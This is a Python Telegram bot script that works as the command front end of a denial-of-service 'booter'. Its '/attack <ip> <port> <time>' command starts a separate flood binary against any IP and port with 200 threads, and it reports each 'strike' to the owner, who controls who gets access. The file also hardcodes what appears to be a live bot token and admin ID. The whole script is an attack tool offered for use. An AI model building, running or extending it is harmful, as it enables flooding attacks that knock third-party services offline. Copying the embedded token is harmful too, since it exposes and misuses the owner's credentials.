import os
import subprocess
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# --- [ CONFIGURATION ] ---
# Aapka naya token aur ID yahan update kar diya hai
TOKEN = "8501319764:AAESY8e2zdVUDvnrMUtGXL7224r3R_z_yf4"
ADMIN_ID = 8163399359 
OWNER_USERNAME = "@PrimeOwner786"
is_attack_running = False

# --- [ STYLISH COLORS ] ---
R, G, Y, B, C, W = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[0m'

def print_banner():
    os.system('clear')
    print(f"{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{R}  ██████╗ ██████╗ ██╗███╗   ███╗███████╗██╗  ██╗ █████╗ ██████╗ {W}")
    print(f"{R}  ██╔══██╗██╔══██╗██║████╗ ████║██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗{W}")
    print(f"{W}  ██████╔╝██████╔╝██║██╔████╔██║█████╗   ╚███╔╝ ███████║██████╔╝{W}")
    print(f"{B}  ██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝   ██╔██╗ ██╔══██║██╔══██╗{W}")
    print(f"{B}  ██║     ██║  ██║██║██║ ╚═╝ ██║███████╗██╔╝ ██╗██║  ██║██║  ██║{W}")
    print(f"{B}  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝{W}")
    print(f"{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{G}  [+] SERVER STATUS : ONLINE (@PrimeOwner786)")
    print(f"{G}  [+] ADMIN ID      : {ADMIN_ID}")
    print(f"{Y}  [!] OWNER         : {OWNER_USERNAME}{W}")
    print(f"{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (f"🚀 *WELCOME TO @PrimeOwner786 ULTRA* 🚀\n\n"
           f"🆔 *Your ID:* `{update.effective_user.id}`\n"
           f"👑 *Owner:* {OWNER_USERNAME}\n\n"
           f"⚡ *Command:* `/attack <ip> <port> <time>`\n\n"
           f"⚠️ *Note:* Optimized for Termux & GitHub.")
    await update.message.reply_text(msg, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text(f"❌ *ACCESS DENIED* ❌\nContact {OWNER_USERNAME} for access.")
        return

    if is_attack_running:
        await update.message.reply_text("⚠️ *BOT BUSY* ⚠️\nWait for current strike to end.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("💡 *Usage:* `/attack <ip> <port> <time>`")
        return

    ip, port, duration = context.args
    is_attack_running = True

    print(f"{G}[STRIKE] {R}Target: {W}{ip}:{port} {Y}Time: {duration}s{W}")
    
    await update.message.reply_text(
        f"🦅 *@PrimeOwner786 STRIKE STARTED* 🦅\n\n"
        f"🎯 *TARGET:* `{ip}`\n"
        f"🔌 *PORT:* `{port}`\n"
        f"⏳ *TIME:* `{duration}s`", 
        parse_mode='Markdown'
    )
    
    try:
        # Binary execution - Thread count 200 for Termux stability
        subprocess.Popen(["./@PRIMEXARMY", ip, port, duration, "200"])
        
        await asyncio.sleep(int(duration))
        await update.message.reply_text(f"✅ *ATTACK FINISHED* 🔥\nTarget: `{ip}:{port}`")
    except Exception as e:
        await update.message.reply_text(f"❌ *ERROR:* {e}")
    finally:
        is_attack_running = False

def main():
    print_banner()
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    
    print(f"{G}--- @PRIMEXARMY BOT IS LIVE ---{W}")
    # drop_pending_updates conflict fix karta hai
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()